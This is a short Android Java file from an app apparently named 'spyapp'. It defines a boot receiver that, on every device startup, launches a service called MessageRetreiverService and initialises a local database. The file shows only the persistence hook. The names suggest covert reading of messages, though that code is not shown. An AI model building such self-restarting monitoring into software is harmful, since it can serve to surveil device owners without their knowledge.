package com.example.spyapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		
		Intent intent2 = new Intent(context,MessageRetreiverService.class);
		context.startService(intent2);
	   	Log.d("BootReceiverspyapp:","onReceive");
		  DatabaseHandler databasehandler1 = new DatabaseHandler(context);
        Log.d("BootReceiverspyapp:","Database Initialized");
 
		
	}

}
